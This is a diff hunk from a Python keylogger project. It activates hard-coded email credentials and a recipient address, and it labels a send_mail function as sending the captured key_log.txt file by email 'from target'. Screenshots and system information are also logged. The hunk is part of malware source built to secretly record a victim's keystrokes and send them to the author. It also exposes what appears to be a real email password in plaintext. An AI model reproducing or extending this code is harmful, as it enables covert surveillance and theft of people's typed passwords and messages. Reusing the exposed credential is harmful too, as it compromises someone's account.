@@ -38,15 +38,15 @@ from PIL import ImageGrab  # to grab images
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 
-# email_address = "vikramathithyan99@gmail.com"
-# password = "Vedha2018"
-#toaddress = "vikramathithyan99@gmail.com"
+email_address = "vikramathithyan99@gmail.com"
+password = "Vedha2018"
+toaddress = "vikramathithyan99@gmail.com"
 
 file_path = "F:\\Coding practise\\Python\\KeyLogger\\Project"
 extend = "\\"
 
 
-function to send the key_log.txt file through email from target
+#function to send the key_log.txt file through email from target
 def send_mail(filename, attachment, toaddr):
     fromaddr = email_address
 
